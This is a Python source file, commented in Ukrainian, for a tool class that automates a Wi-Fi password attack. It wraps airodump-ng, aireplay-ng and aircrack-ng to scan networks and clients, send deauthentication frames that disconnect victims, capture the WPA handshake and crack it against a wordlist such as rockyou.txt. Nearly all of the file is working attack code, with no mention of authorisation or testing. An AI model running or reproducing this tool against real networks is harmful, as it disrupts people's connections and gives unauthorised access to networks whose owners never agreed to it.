import csv
import signal
import subprocess
import tempfile
import time
import os
from pathlib import Path
from typing import Dict, List


class API:
    """Логіка без UI: робота з інтерфейсами та сканування мереж."""

    def __init__(self) -> None:
        # Створюємо папку caps, якщо її немає
        self.caps_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "caps")
        self.result_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "result")
        
        os.makedirs(self.caps_dir, exist_ok=True)
        os.makedirs(self.result_dir, exist_ok=True)
        self.last_scan: List[Dict] = []  # кеш останнього скану

    # ────────────────────────────────────────────────
    # 1. Список Wi-Fi-інтерфейсів
    # ────────────────────────────────────────────────
    def get_wireless_devices(self) -> List[str]:
        devices: List[str] = []
        try:
            out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                if line.lstrip().startswith("Interface"):
                    _, iface = line.split(None, 1)
                    devices.append(iface.strip())
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass
        return devices

    # ────────────────────────────────────────────────
    # 2. Скан Wi-Fi-мереж
    # ────────────────────────────────────────────────
    def scan_network(self, interface: str, timeout: int = 6) -> List[Dict]:
        """
        Запускає airodump-ng, чекає *timeout* секунд, повертає список AP.
        Ключі словника: bssid, channel, power, encryption, ssid, first_time.
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            prefix = Path(tmpdir) / "dump"
            cmd = [
                "airodump-ng",
                "--output-format",
                "csv",
                "-w",
                str(prefix),
                interface,
            ]
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except FileNotFoundError:
                raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None

            # дати час зібрати пакети
            time.sleep(timeout)
            proc.send_signal(signal.SIGINT)  # коректно завершуємо
            proc.wait(timeout=3)

            # шукаємо CSV
            csv_path = next(Path(tmpdir).glob("dump-*.csv"), None)
            if not csv_path or not csv_path.exists():
                raise RuntimeError("airodump-ng did not produce CSV output.")

            ap_list: List[Dict] = []
            with csv_path.open(newline="", encoding="utf-8", errors="ignore") as fh:
                rdr = csv.reader(fh)
                for row in rdr:
                    if not row:
                        continue
                    if row[0].strip() == "BSSID":  # шапка AP-секції
                        continue
                    if row[0].strip().lower() == "station mac":  # дійшли до клієнтів
                        break
                    # 14+ колонок: BSSID, First time seen, Last time seen, channel ...
                    if len(row) < 14:
                        continue
                    ap_list.append(
                        {
                            "bssid": row[0].strip(),
                            "first_time": row[1].strip(),
                            "channel": row[3].strip(),
                            "power": row[8].strip(),
                            "encryption": row[5].strip(),
                            "ssid": row[13].strip(),
                        }
                    )

            self.last_scan = ap_list  # кешуємо
            return ap_list

    # ────────────────────────────────────────────────
    # 3. Інфо за BSSID
    # ────────────────────────────────────────────────
    def get_info_by_bssid(self, bssid: str) -> Dict:
        """Повернути словник із self.last_scan за вказаним BSSID."""
        for net in self.last_scan:
            if net["bssid"].lower() == bssid.lower():
                return net
        raise ValueError("BSSID not found in last scan.")

    # ────────────────────────────────────────────────
    # 4. Отримати підключених клієнтів
    # ────────────────────────────────────────────────
    def get_connected_clients(self, interface: str, timeout: int = 15) -> List[Dict]:
        """
        Запускає airodump-ng, чекає *timeout* секунд, повертає список підключених клієнтів.
        Ключі словника: station, bssid, power, packets.
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            prefix = Path(tmpdir) / "clients"
            cmd = [
                "airodump-ng",
                "--output-format",
                "csv",
                "-w",
                str(prefix),
                interface,
            ]
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except FileNotFoundError:
                raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None

            # дати час зібрати дані про клієнтів
            time.sleep(timeout)
            proc.send_signal(signal.SIGINT)  # коректно завершуємо
            proc.wait(timeout=3)

            # шукаємо CSV
            csv_path = next(Path(tmpdir).glob("clients-*.csv"), None)
            if not csv_path or not csv_path.exists():
                raise RuntimeError("airodump-ng did not produce CSV output.")

            clients_list: List[Dict] = []
            in_stations_section = False
            
            with csv_path.open(newline="", encoding="utf-8", errors="ignore") as fh:
                rdr = csv.reader(fh)
                for row in rdr:
                    if not row:
                        continue
                    if row[0].strip().lower() == "station mac":  # початок секції клієнтів
                        in_stations_section = True
                        continue
                    if in_stations_section and len(row) >= 6:
                        clients_list.append({
                            "station": row[0].strip(),  # MAC адреса клієнта
                            "bssid": row[5].strip(),     # MAC адреса точки доступу
                            "power": row[3].strip(),      # Потужність сигналу
                            "packets": row[4].strip(),    # Кількість пакетів
                        })

            return clients_list

    # ────────────────────────────────────────────────
    # 5. Збір рукостискань (handshake)
    # ────────────────────────────────────────────────
    def get_handshake(self, interface: str, channel: str, bssid: str, timeout: int = 120) -> str:
        """Захоплює handshake і зберігає у папці caps"""
        # Генеруємо унікальне ім'я файлу
        timestamp = int(time.time())
        filename = f"handshake_{bssid.replace(':', '')}_{timestamp}"
        result_path = os.path.join(self.caps_dir, filename)
        
        cmd = [
            "airodump-ng",
            "-c", channel,
            "--bssid", bssid,
            "-w", result_path,
            interface
        ]
        
        try:
            proc = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Чекаємо поки з'явиться handshake
            start_time = time.time()
            while True:
                if (time.time() - start_time) > timeout:
                    proc.terminate()
                    proc.wait()
                    # Перевіряємо наявність файлу навіть якщо timeout
                    cap_file = f"{result_path}-01.cap"
                    if os.path.exists(cap_file):
                        return cap_file
                    return ""
                    
                line = proc.stderr.readline()
                if not line:
                    time.sleep(1)
                    continue
                    
                if "WPA handshake" in line:
                    proc.terminate()
                    proc.wait()
                    cap_file = f"{result_path}-01.cap"
                    if os.path.exists(cap_file):
                        return cap_file
                    return ""
                    
        except Exception as e:
            if proc:
                proc.terminate()
            return ""
        # ────────────────────────────────────────────────
        # 6. Деаутентифікація клієнтів
        # ────────────────────────────────────────────────
    def deauth_clients(self, interface: str, router_bssid: str, clients: List[str], 
                    count: int = 3, interval: int = 60) -> bool:
        """
        Виконує деаутентифікацію клієнтів для стимуляції handshake.
        
        Args:
            interface: мережевий інтерфейс (наприклад, 'wlan0mon')
            router_bssid: MAC-адреса точки доступу (наприклад, 'AA:BB:CC:DD:EE:FF')
            clients: список MAC-адрес клієнтів (наприклад, ['11:22:33:44:55:66'])
            count: кількість пакетів деаутентифікації на клієнта
            interval: пауза між атаками (секунди)
            
        Returns:
            bool: True якщо всі атаки успішні, False якщо були помилки
        """
        success = True
        
        for client_bssid in clients:
            cmd = [
                "aireplay-ng",
                "-0", str(count),
                "-a", str(router_bssid),  # Ensure this is a string
                "-c", str(client_bssid),  # Ensure this is a string
                str(interface)  # Ensure this is a string
            ]
            
            try:
                print(f"Відправляю {count} деаутентифікаційних пакетів до клієнта {client_bssid}...")
                subprocess.run(
                    cmd,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=interval
                )
            except subprocess.CalledProcessError as e:
                print(f"Помилка при деаутентифікації клієнта {client_bssid}: {e.stderr}")
                success = False
            except subprocess.TimeoutExpired:
                print(f"Час виконання команди для клієнта {client_bssid} вийшов")
                success = False
            except FileNotFoundError:
                print("Помилка: aireplay-ng не знайдено. Встановіть aircrack-ng.")
                return False
            except Exception as e:
                print(f"Невідома помилка: {str(e)}")
                success = False
            
            if client_bssid != clients[-1]:  # Не чекати після останнього клієнта
                print(f"Очікую {interval} секунд перед наступною атакою...")
                time.sleep(interval)
        
        return success



    def parse_password(self, router_bssid: str, router_ssid: str) -> str:
        """Спроба підібрати пароль за допомогою aircrack-ng"""
        # Шлях до словника паролів
        wordlist_path = os.path.join(self.result_dir, f"{router_ssid}.txt")
        
        if not os.path.exists(wordlist_path):
            raise FileNotFoundError(f"Файл словника {wordlist_path} не знайдено")
        
        # Шукаємо .cap файли
        cap_files = list(Path(self.caps_dir).glob("handshake_*.cap"))
        if not cap_files:
            raise FileNotFoundError("Не знайдено жодного .cap файлу для аналізу")
        
        # Сортуємо за часом модифікації
        latest_cap = sorted(cap_files, key=os.path.getmtime, reverse=True)[0]
        
        cmd = [
            "aircrack-ng",
            "-a2",
            "-b", router_bssid,
            "-w", wordlist_path,
            str(latest_cap)
        ]
        
        try:
            print("ШУКАЄМО ПАРОЛЬ...")
            result = subprocess.run(
                cmd,
                check=False,  # Не генерувати виняток для ненульового коду
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300
            )
            
            # Аналізуємо вивід
            output = result.stdout + result.stderr
            if "KEY FOUND!" in output:
                for line in output.split('\n'):
                    if "KEY FOUND!" in line:
                        return line.split("[")[1].split("]")[0]
            
            if "Passphrase not in dictionary" in output:
                return ""
                
            if "No networks found" in output or "ap_cur != NULL" in output:
                raise RuntimeError("Некоректний .cap файл - не містить handshake")
                
            return ""
            
        except subprocess.TimeoutExpired:
            print("Час підбору пароля вийшов")
            return ""
        except Exception as e:
            raise RuntimeError(f"Помилка aircrack-ng: {str(e)}")


    def brute_force_password(self, router_bssid: str, wordlist_path: str = "/usr/share/wordlists/rockyou.txt.gz") -> str:
        """Брутфорс пароля з використанням rockyou.txt"""
        # Розпаковуємо архів, якщо потрібно
        if wordlist_path.endswith('.gz'):
            import gzip
            import shutil
            unpacked_path = os.path.join(self.result_dir, "rockyou.txt")
            
            if not os.path.exists(unpacked_path):
                try:
                    with gzip.open(wordlist_path, 'rb') as f_in:
                        with open(unpacked_path, 'wb') as f_out:
                            shutil.copyfileobj(f_in, f_out)
                    wordlist_path = unpacked_path
                except Exception as e:
                    raise RuntimeError(f"Не вдалося розпакувати wordlist: {str(e)}")
            else:
                wordlist_path = unpacked_path

        # Шукаємо останній .cap файл
        cap_files = list(Path(self.caps_dir).glob("handshake_*.cap"))
        if not cap_files:
            raise FileNotFoundError("Не знайдено жодного .cap файлу для аналізу")
        
        latest_cap = sorted(cap_files, key=os.path.getmtime, reverse=True)[0]

        cmd = [
            "aircrack-ng",
            "-a2",
            "-b", router_bssid,
            "-w", wordlist_path,
            str(latest_cap)
        ]

        try:
            print("BRUTE FORCING PASSWORD...")
            result = subprocess.run(
                cmd,
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=3600  # 1 година максимально
            )

            # Аналізуємо вивід
            output = result.stdout + result.stderr
            if "KEY FOUND!" in output:
                for line in output.split('\n'):
                    if "KEY FOUND!" in line:
                        return line.split("[")[1].split("]")[0]
            
            return ""
            
        except subprocess.TimeoutExpired:
            print("Час підбору пароля вийшов")
            return ""
        except Exception as e:
            raise RuntimeError(f"Помилка aircrack-ng: {str(e)}")